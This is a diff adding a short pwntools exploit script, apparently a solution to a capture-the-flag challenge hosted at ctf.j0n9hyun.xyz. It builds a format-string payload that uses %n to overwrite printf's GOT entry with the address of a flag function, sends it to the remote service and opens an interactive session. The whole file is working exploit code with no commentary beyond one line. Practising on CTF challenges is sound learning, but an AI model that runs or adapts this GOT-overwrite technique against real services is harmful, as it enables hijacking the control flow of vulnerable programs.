@@ -1,0 +1,26 @@
+from pwn import *
+
+
+
+r = remote("ctf.j0n9hyun.xyz", 3002)
+
+
+flag = 0x080485b4
+printf_got = 0x0804a00c
+
+
+
+
+# printf_got -> flag
+
+payload  = b""
+payload += p32(printf_got)
+payload += b"%%%d"%(flag-4)
+payload += b"x%n"
+
+
+
+
+r.sendline(payload)
+
+r.interactive()
